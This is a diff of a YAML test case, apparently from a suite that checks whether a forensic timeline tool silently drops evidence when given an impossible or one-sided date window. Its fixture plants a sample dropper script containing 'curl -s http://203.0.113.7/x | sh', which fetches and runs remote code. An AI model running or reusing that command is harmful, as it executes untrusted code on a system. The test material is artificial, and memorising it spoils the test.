@@ -13,8 +13,8 @@ realism: possible
 realism_ko: "한쪽 경계만 주는 호출은 흔하지만, 4월 31일 같은 없는 날짜는 드물다."
 coverage: full
 summary: build_timeline with since_iso "2026-04-31T00:00:00Z" (no such day) or with only since_iso returns a timeline without the dropper's filesystem event and without any error, while the valid window includes it and find_recent_changes rejects the same bad value.
-summary_ko: "since_iso \"2026-04-31T00:00:00Z\"(없는 날짜)나 since_iso만 준 build_timeline은 dropper의 파일 시스템 이벤트가 빠진 타임라인을 오류 없이 돌려준다. 올바른 구간에서는 그 이벤트가 들어가고, find_recent_changes는 같은 잘못된 값을 거부한다."
-defect_ko: "정상이라면 못 읽은 시각은 오류로 알리고 한쪽 경계만 줘도 모든 출처를 포함해야 하는데, 이 서버는 못 읽은 값을 버리고 한쪽 경계만 있으면 파일 수정 사건을 말없이 뺀다. 그래서 모델은 dropper 파일 수정이 없었다고 잘못 안다."
+summary_ko: "`since_iso`에 없는 날짜 \"2026-04-31T00:00:00Z\"를 주거나 `since_iso`만 주면, `build_timeline`은 dropper의 파일 시스템 이벤트가 빠진 타임라인을 오류 없이 돌려준다. 올바른 구간에서는 그 이벤트가 들어가고, `find_recent_changes`는 같은 잘못된 값을 거부한다."
+defect_ko: "`build_timeline`은 못 읽은 시각을 버리고, 경계가 한쪽만 있으면 파일 수정 사건을 말없이 뺀다. 못 읽은 값은 오류로 알리고, 한쪽 경계만 있어도 모든 출처를 넣어야 한다. 모델은 dropper 파일 수정이 없었다고 잘못 안다."
 setup_ko: "SSH 로그인 한 줄이 있는 `auth.log`와 `/tmp/dropper.sh` 파일을 두었다."
 fixture:
   - path: case/auth.log
@@ -23,24 +23,24 @@ fixture:
     text: "#!/bin/sh\ncurl -s http://203.0.113.7/x | sh\n"
 steps:
   - tool: build_timeline
-    note_ko: "결함이 있는 호출: 없는 날짜를 시작으로 줌"
+    note_ko: "결함 호출: 없는 날짜를 시작으로 줌"
     args:
       evidence_root: ${EVIDENCE}/case
       since_iso: "2026-04-31T00:00:00Z"
       until_iso: "2100-01-01T00:00:00Z"
   - tool: build_timeline
-    note_ko: "결함이 있는 호출: 시작만 줌"
+    note_ko: "결함 호출: 시작만 줌"
     args:
       evidence_root: ${EVIDENCE}/case
       since_iso: "2000-01-01T00:00:00Z"
   - tool: build_timeline
-    note_ko: "비교용: 올바른 시작과 끝을 줌"
+    note_ko: "비교 호출: 올바른 시작과 끝을 줌"
     args:
       evidence_root: ${EVIDENCE}/case
       since_iso: "2000-01-01T00:00:00Z"
       until_iso: "2100-01-01T00:00:00Z"
   - tool: find_recent_changes
-    note_ko: "비교용: 같은 잘못된 날짜를 다른 도구에 줌"
+    note_ko: "비교 호출: 같은 잘못된 날짜를 다른 도구에 줌"
     args:
       root_path: ${EVIDENCE}/case/fs
       since_iso: "2026-04-31T00:00:00Z"
